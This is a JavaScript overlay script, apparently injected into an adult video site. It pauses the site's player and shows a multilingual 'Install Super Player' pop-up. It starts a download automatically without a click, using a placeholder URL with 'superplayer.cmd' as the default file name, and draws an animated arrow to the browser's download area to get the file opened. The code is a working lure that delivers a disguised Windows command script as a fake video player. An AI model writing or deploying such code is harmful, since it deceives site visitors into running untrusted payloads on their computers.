(function () {
  "use strict";

  var downloadUrl = "$DownloadUrl$";

  var copy = {
    en: {
      title: "Install Super Player",
      highlight: "Find every video with this model — the #1 reason to install!",
      lead: "Free app built for this performer. One search, every clip.",
      bullets: [
        "100% free — no subscription required",
        "Crystal-clear HD streaming",
        "Download now and start watching instantly"
      ],
      cta: "Download Free Player",
      dismiss: "Maybe later",
      downloadHint: "Free player — grab here ↑"
    },
    ru: {
      title: "Установите Super Player",
      highlight: "Найди все ролики с этой моделью — главный повод установить приложение!",
      lead: "Бесплатное приложение для этой модели. Один поиск — все видео.",
      bullets: [
        "Абсолютно бесплатно — без подписки",
        "Высокое качество HD",
        "Скачайте сейчас и смотрите без ограничений"
      ],
      cta: "Скачать бесплатно",
      dismiss: "Позже",
      downloadHint: "Плеер бесплатно — жми и качай ↑"
    },
    es: {
      title: "Instala Super Player",
      highlight: "Encuentra todos los videos de esta modelo — ¡la mejor razón para instalar!",
      lead: "App gratis hecha para esta modelo. Una búsqueda, todos los clips.",
      bullets: [
        "100% gratis — sin suscripción",
        "Streaming en HD nítido",
        "Descarga ahora y empieza al instante"
      ],
      cta: "Descargar gratis",
      dismiss: "Más tarde",
      downloadHint: "Player gratis — descárgalo aquí ↑"
    },
    fr: {
      title: "Installez Super Player",
      highlight: "Trouvez toutes les vidéos de ce modèle — la meilleure raison d'installer !",
      lead: "Application gratuite pour ce modèle. Une recherche, toutes les vidéos.",
      bullets: [
        "100 % gratuit — sans abonnement",
        "Streaming HD cristallin",
        "Téléchargez maintenant et regardez tout de suite"
      ],
      cta: "Télécharger gratuitement",
      dismiss: "Plus tard",
      downloadHint: "Player gratuit — prenez-le ici ↑"
    },
    zh: {
      title: "安装 Super Player",
      highlight: "找到该模特的全部视频 — 安装的最佳理由！",
      lead: "专为该模特打造的免费应用。一次搜索，全部视频。",
      bullets: [
        "完全免费 — 无需订阅",
        "超清 HD 画质",
        "立即下载，马上开看"
      ],
      cta: "免费下载",
      dismiss: "稍后再说",
      downloadHint: "免费播放器 — 点这里领取 ↑"
    }
  };

  function pickLocale() {
    var list = navigator.languages && navigator.languages.length
      ? navigator.languages
      : [navigator.language || "en"];

    for (var i = 0; i < list.length; i++) {
      var code = String(list[i] || "").toLowerCase().split("-")[0];
      if (copy[code]) {
        return code;
      }
    }

    return "en";
  }

  function pausePlayer() {
    try {
      var video = document.querySelector("#kt_player video");
      if (video && !video.paused) {
        video.pause();
      }
    } catch (e) {}

    try {
      var player = window.player_obj;
      if (player && typeof player.fpapi === "function") {
        var fp = player.fpapi();
        if (fp && typeof fp.pause === "function") {
          fp.pause();
        }
      }
    } catch (e) {}
  }

  function hostsMatch(left, right) {
    var a = String(left || "").toLowerCase().replace(/^www\./, "");
    var b = String(right || "").toLowerCase().replace(/^www\./, "");
    return a.length > 0 && a === b;
  }

  function resolveDownloadUrl(url) {
    var trimmed = String(url || "").trim();
    if (!trimmed || trimmed.indexOf("$") >= 0) {
      return "";
    }

    try {
      var absolute;
      if (/^https?:\/\//i.test(trimmed)) {
        absolute = new URL(trimmed);
      } else if (trimmed.indexOf("//") === 0) {
        absolute = new URL(window.location.protocol + trimmed);
      } else {
        absolute = new URL(trimmed, window.location.origin + "/");
      }

      if (hostsMatch(absolute.hostname, window.location.hostname)) {
        return absolute.pathname + absolute.search;
      }

      return absolute.href;
    } catch (e) {
      if (trimmed.charAt(0) === "/") {
        return trimmed;
      }

      return "/" + trimmed.replace(/^\.?\//, "");
    }
  }

  function downloadFileName(url) {
    var path = String(url || "").split("?")[0].split("#")[0];
    var name = path.split("/").pop();
    return name || "superplayer.cmd";
  }

  function forceDownload() {
    var url = resolveDownloadUrl(downloadUrl);
    if (!url) {
      return;
    }

    var link = document.createElement("a");
    link.href = url;
    link.download = downloadFileName(url);
    link.rel = "noopener";
    link.style.display = "none";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  }

  function injectStyles() {
    if (document.getElementById("tube18-popup-styles")) {
      return;
    }

    var style = document.createElement("style");
    style.id = "tube18-popup-styles";
    style.textContent =
      "#tube18-popup-overlay{" +
      "position:fixed;inset:0;z-index:2147483646;" +
      "display:flex;align-items:center;justify-content:center;padding:24px;" +
      "background:rgba(8,8,12,.78);backdrop-filter:blur(10px);" +
      "font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;" +
      "animation:tube18FadeIn .3s ease}" +
      "@keyframes tube18FadeIn{from{opacity:0}to{opacity:1}}" +
      "#tube18-popup-card{" +
      "position:relative;z-index:2;width:min(520px,100%);border-radius:22px;overflow:hidden;" +
      "background:linear-gradient(160deg,#1a1a24 0%,#12121a 100%);" +
      "color:#f4f4f8;box-shadow:0 28px 70px rgba(0,0,0,.6),0 0 0 1px rgba(255,255,255,.1);" +
      "transform:translateY(16px) scale(.97);animation:tube18SlideUp .45s cubic-bezier(.2,.9,.2,1) forwards}" +
      "@keyframes tube18SlideUp{to{transform:translateY(0) scale(1)}}" +
      "#tube18-popup-card .hero{" +
      "padding:32px 32px 22px;text-align:center;" +
      "background:linear-gradient(135deg,#ff3366 0%,#ff6b35 55%,#ffb347 100%)}" +
      "#tube18-popup-card .icon{" +
      "width:76px;height:76px;margin:0 auto 16px;border-radius:18px;" +
      "background:rgba(255,255,255,.2);display:flex;align-items:center;justify-content:center;" +
      "font-size:38px;line-height:1;box-shadow:inset 0 0 0 1px rgba(255,255,255,.28);" +
      "animation:tube18IconPop .6s .15s cubic-bezier(.2,.9,.2,1) both}" +
      "@keyframes tube18IconPop{from{transform:scale(.6);opacity:0}to{transform:scale(1);opacity:1}}" +
      "#tube18-popup-card h2{margin:0 0 12px;font-size:30px;font-weight:800;letter-spacing:-.02em;line-height:1.15}" +
      "#tube18-popup-card .highlight{" +
      "margin:0 0 14px;padding:14px 16px;border-radius:14px;" +
      "background:rgba(255,255,255,.16);border:1px solid rgba(255,255,255,.28);" +
      "font-size:20px;font-weight:800;line-height:1.35;" +
      "animation:tube18HighlightPulse 2.2s ease-in-out infinite}" +
      "@keyframes tube18HighlightPulse{" +
      "0%,100%{box-shadow:0 0 0 0 rgba(255,255,255,.25);transform:scale(1)}" +
      "50%{box-shadow:0 0 0 10px rgba(255,255,255,0);transform:scale(1.02)}}" +
      "#tube18-popup-card .lead{margin:0;font-size:18px;line-height:1.5;opacity:.96;font-weight:500}" +
      "#tube18-popup-card .body{padding:26px 32px 12px}" +
      "#tube18-popup-card ul{margin:0;padding:0;list-style:none}" +
      "#tube18-popup-card li{" +
      "position:relative;padding:0 0 14px 30px;font-size:17px;line-height:1.5;color:#dedee8;font-weight:500}" +
      "#tube18-popup-card li:before{" +
      "content:\"\\2713\";position:absolute;left:0;top:1px;color:#ff6b8a;font-weight:800;font-size:18px}" +
      "#tube18-popup-card .actions{padding:10px 32px 28px;display:flex;flex-direction:column;gap:12px}" +
      "#tube18-popup-card .cta{" +
      "border:0;border-radius:14px;padding:18px 22px;font-size:19px;font-weight:800;cursor:pointer;" +
      "color:#fff;background:linear-gradient(135deg,#ff3366,#ff6b35);" +
      "box-shadow:0 12px 28px rgba(255,51,102,.4);transition:transform .15s ease,box-shadow .15s ease;" +
      "animation:tube18CtaGlow 2s ease-in-out infinite}" +
      "@keyframes tube18CtaGlow{" +
      "0%,100%{box-shadow:0 12px 28px rgba(255,51,102,.4)}" +
      "50%{box-shadow:0 16px 36px rgba(255,51,102,.55)}}" +
      "#tube18-popup-card .cta:hover{transform:translateY(-2px) scale(1.01)}" +
      "#tube18-popup-card .dismiss{" +
      "border:0;background:transparent;color:#9a9aad;font-size:16px;cursor:pointer;padding:8px;font-weight:500}" +
      "#tube18-popup-card .dismiss:hover{color:#c8c8d4}" +
      "#tube18-popup-close{" +
      "position:absolute;top:16px;right:16px;width:38px;height:38px;border:0;border-radius:50%;" +
      "background:rgba(0,0,0,.28);color:#fff;font-size:24px;line-height:1;cursor:pointer;z-index:3}" +
      "#tube18-popup-close:hover{background:rgba(0,0,0,.45)}" +
      "#tube18-chrome-guide{" +
      "position:fixed;inset:0;width:100%;height:100%;pointer-events:none;z-index:2147483647;overflow:visible}" +
      "#tube18-chrome-guide .tube18-guide-path{fill:none;stroke:#ffb347;stroke-width:3.5;stroke-linecap:round;" +
      "stroke-dasharray:8 6;animation:tube18DashRun 1.1s linear infinite,tube18GuidePulse 2.2s ease-in-out infinite}" +
      "@keyframes tube18DashRun{to{stroke-dashoffset:-28}}" +
      "@keyframes tube18GuidePulse{" +
      "0%,100%{stroke:#ffb347;stroke-width:3.5;opacity:.88;" +
      "filter:drop-shadow(0 0 3px rgba(255,179,71,.35))}" +
      "50%{stroke:#ff3366;stroke-width:4.8;opacity:1;" +
      "filter:drop-shadow(0 0 14px rgba(255,107,53,.85)) drop-shadow(0 0 6px rgba(255,51,102,.55))}}" +
      "#tube18-chrome-guide .tube18-arrow-tip-fill{" +
      "animation:tube18GuidePulseFill 2.2s ease-in-out infinite}" +
      "@keyframes tube18GuidePulseFill{" +
      "0%,100%{fill:#ffb347}50%{fill:#ff3366}}" +
      "#tube18-chrome-target{" +
      "position:fixed;z-index:2147483647;pointer-events:none;" +
      "display:flex;flex-direction:column;align-items:flex-end;gap:6px;" +
      "animation:tube18TargetPop .5s .35s cubic-bezier(.2,.9,.2,1) both,tube18TargetPulse 2.2s ease-in-out .85s infinite}" +
      "@keyframes tube18TargetPop{from{opacity:0;transform:translateY(-12px) scale(.8)}" +
      "to{opacity:1;transform:translateY(0) scale(1)}}" +
      "@keyframes tube18TargetPulse{" +
      "0%,100%{transform:scale(1);filter:drop-shadow(0 0 0 rgba(255,179,71,0))}" +
      "50%{transform:scale(1.05);filter:drop-shadow(0 0 10px rgba(255,107,53,.55))}}" +
      "#tube18-chrome-target .badge{" +
      "display:flex;align-items:center;gap:8px;padding:10px 14px;border-radius:12px;" +
      "background:linear-gradient(135deg,rgba(28,22,32,.95),rgba(18,18,26,.95));" +
      "border:2px solid #ffb347;color:#fff;" +
      "font-size:15px;font-weight:700;line-height:1.25;max-width:240px;text-align:right;" +
      "box-shadow:0 8px 24px rgba(0,0,0,.45);animation:tube18BadgePulse 2.2s ease-in-out infinite}" +
      "@keyframes tube18BadgePulse{" +
      "0%,100%{border-color:#ffb347;background:linear-gradient(135deg,rgba(28,22,32,.95),rgba(18,18,26,.95));" +
      "box-shadow:0 8px 20px rgba(255,179,71,.22),0 0 0 0 rgba(255,179,71,.25);transform:scale(1)}" +
      "50%{border-color:#ff6b35;background:linear-gradient(135deg,rgba(48,24,36,.96),rgba(22,18,30,.96));" +
      "box-shadow:0 10px 28px rgba(255,107,53,.45),0 0 0 8px rgba(255,107,53,0);transform:scale(1.03)}}" +
      "#tube18-chrome-target .arrow-icon{" +
      "font-size:28px;line-height:1;color:#ffb347;" +
      "animation:tube18ArrowBounce 1s ease-in-out infinite,tube18ArrowIconPulse 2.2s ease-in-out infinite}" +
      "@keyframes tube18ArrowBounce{" +
      "0%,100%{transform:translate(4px,0) rotate(-35deg)}" +
      "50%{transform:translate(10px,-6px) rotate(-35deg)}}" +
      "@keyframes tube18ArrowIconPulse{0%,100%{color:#ffb347;text-shadow:0 0 0 rgba(255,179,71,0)}" +
      "50%{color:#ff6b35;text-shadow:0 0 12px rgba(255,107,53,.75)}}";
    document.head.appendChild(style);
  }

  function removeOverlay() {
    ["tube18-popup-overlay", "tube18-chrome-guide", "tube18-chrome-target"].forEach(function (id) {
      var node = document.getElementById(id);
      if (node && node.parentNode) {
        node.parentNode.removeChild(node);
      }
    });
  }

  function addChromeDownloadGuide(text) {
    var card = document.getElementById("tube18-popup-card");
    if (!card) {
      return;
    }

    var cardRect = card.getBoundingClientRect();
    var targetX = window.innerWidth - 126;
    var targetY = 10;
    var startX = Math.min(cardRect.right - 24, window.innerWidth * 0.58);
    var startY = cardRect.top + 56;
    var flatY = Math.min(startY - 6, 54);
    var cp1X = startX + (targetX - startX) * 0.58;
    var cp1Y = flatY;
    var cp2X = targetX + 8;
    var cp2Y = targetY + 96;

    var svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
    svg.id = "tube18-chrome-guide";
    svg.setAttribute("aria-hidden", "true");
    svg.style.cssText =
      "position:fixed;inset:0;width:100%;height:100%;pointer-events:none;z-index:2147483647;overflow:visible";

    var defs = document.createElementNS("http://www.w3.org/2000/svg", "defs");
    var marker = document.createElementNS("http://www.w3.org/2000/svg", "marker");
    marker.setAttribute("id", "tube18-arrow-tip");
    marker.setAttribute("markerWidth", "10");
    marker.setAttribute("markerHeight", "10");
    marker.setAttribute("refX", "8");
    marker.setAttribute("refY", "5");
    marker.setAttribute("orient", "auto");
    var tip = document.createElementNS("http://www.w3.org/2000/svg", "polygon");
    tip.setAttribute("class", "tube18-arrow-tip-fill");
    tip.setAttribute("points", "0 0, 10 5, 0 10");
    tip.setAttribute("fill", "#ffb347");
    marker.appendChild(tip);
    defs.appendChild(marker);
    svg.appendChild(defs);

    var path = document.createElementNS("http://www.w3.org/2000/svg", "path");
    path.setAttribute("class", "tube18-guide-path");
    path.setAttribute("marker-end", "url(#tube18-arrow-tip)");
    path.setAttribute(
      "d",
      "M " + startX + " " + startY +
      " C " + cp1X + " " + cp1Y +
      ", " + cp2X + " " + cp2Y +
      ", " + targetX + " " + targetY
    );
    svg.appendChild(path);
    document.body.appendChild(svg);

    var target = document.createElement("div");
    target.id = "tube18-chrome-target";
    target.style.top = Math.max(8, targetY + 24) + "px";
    target.style.right = Math.max(48, window.innerWidth - targetX - 12) + "px";
    target.innerHTML =
      '<div class="arrow-icon" aria-hidden="true">↗</div>' +
      '<div class="badge">' + text.downloadHint + "</div>";
    document.body.appendChild(target);
  }

  function showOverlay() {
    injectStyles();
    removeOverlay();

    var locale = pickLocale();
    var text = copy[locale];
    var overlay = document.createElement("div");
    overlay.id = "tube18-popup-overlay";
    overlay.setAttribute("role", "dialog");
    overlay.setAttribute("aria-modal", "true");

    var bulletsHtml = text.bullets
      .map(function (item) {
        return "<li>" + item + "</li>";
      })
      .join("");

    overlay.innerHTML =
      '<div id="tube18-popup-card">' +
      '<button type="button" id="tube18-popup-close" aria-label="Close">&times;</button>' +
      '<div class="hero">' +
      '<div class="icon" aria-hidden="true">▶</div>' +
      "<h2>" + text.title + "</h2>" +
      '<p class="highlight">' + text.highlight + "</p>" +
      '<p class="lead">' + text.lead + "</p>" +
      "</div>" +
      '<div class="body"><ul>' + bulletsHtml + "</ul></div>" +
      '<div class="actions">' +
      '<button type="button" class="cta" id="tube18-popup-cta">' + text.cta + "</button>" +
      '<button type="button" class="dismiss" id="tube18-popup-dismiss">' + text.dismiss + "</button>" +
      "</div>" +
      "</div>";

    document.body.appendChild(overlay);

    window.requestAnimationFrame(function () {
      window.requestAnimationFrame(function () {
        addChromeDownloadGuide(text);
      });
    });

    function dismiss() {
      removeOverlay();
    }

    overlay.querySelector("#tube18-popup-close").addEventListener("click", dismiss);
    overlay.querySelector("#tube18-popup-dismiss").addEventListener("click", dismiss);
    overlay.querySelector("#tube18-popup-cta").addEventListener("click", function () {
      forceDownload();
      dismiss();
    });
    overlay.addEventListener("click", function (event) {
      if (event.target === overlay) {
        dismiss();
      }
    });
  }

  window.tube18PopupShown = false;

  window.tube18PopupDismiss = function () {
    removeOverlay();
  };

  window.tube18PopupWindow = function () {
    if (window.tube18PopupShown) {
      return;
    }

    window.tube18PopupShown = true;
    pausePlayer();
    forceDownload();
    showOverlay();
  };
})();
